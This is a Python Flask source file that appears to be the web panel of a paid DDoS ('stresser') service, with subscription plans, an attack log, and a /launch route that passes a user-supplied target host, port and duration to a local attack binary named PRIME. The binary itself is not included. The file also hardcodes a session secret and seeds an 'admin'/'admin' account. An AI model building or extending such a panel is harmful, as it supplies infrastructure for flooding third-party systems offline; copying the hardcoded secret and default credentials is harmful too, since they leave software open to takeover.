from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import subprocess
import os

app = Flask(__name__)
app.secret_key = "PRIME_V6_KEY_99"

# Database config
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///prime_data.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# ------------------ MODELS ------------------

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)
    plan = db.Column(db.String(20), default="Premium Plan")
    expiry = db.Column(db.String(20), default="15/07/2028")

class AttackLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    target = db.Column(db.String(80))
    port = db.Column(db.String(10))
    time = db.Column(db.Integer)
    user = db.Column(db.String(80))

# ------------------ INIT DB ------------------

with app.app_context():
    db.create_all()
    if not User.query.filter_by(username='admin').first():
        db.session.add(User(
            username='admin',
            password=generate_password_hash('admin')
        ))
        db.session.commit()

# ------------------ ROUTES ------------------

@app.route('/')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))

    user_data = User.query.filter_by(username=session['user']).first()
    logs = AttackLog.query.order_by(AttackLog.id.desc()).limit(10).all()

    return render_template('index.html', user=user_data, logs=logs)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        u = User.query.filter_by(username=username).first()

        if u and check_password_hash(u.password, password):
            session['user'] = u.username
            return redirect(url_for('dashboard'))

    return render_template('login.html')


@app.route('/launch', methods=['POST'])
def launch():
    if 'user' not in session:
        return jsonify({"status": "error", "message": "Login required"})

    host = request.form.get('host')
    port = request.form.get('port')
    duration = request.form.get('time')

    db.session.add(AttackLog(
        target=host,
        port=port,
        time=duration,
        user=session['user']
    ))
    db.session.commit()

    try:
        # Ensure binary exists
        if not os.path.exists("./PRIME"):
            return jsonify({"status": "error", "message": "PRIME file missing"})

        subprocess.Popen(
            ["./PRIME", host, port, duration],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        return jsonify({"status": "success", "message": f"🚀 Sent to {host}"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect(url_for('login'))

# ------------------ RUN ------------------

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
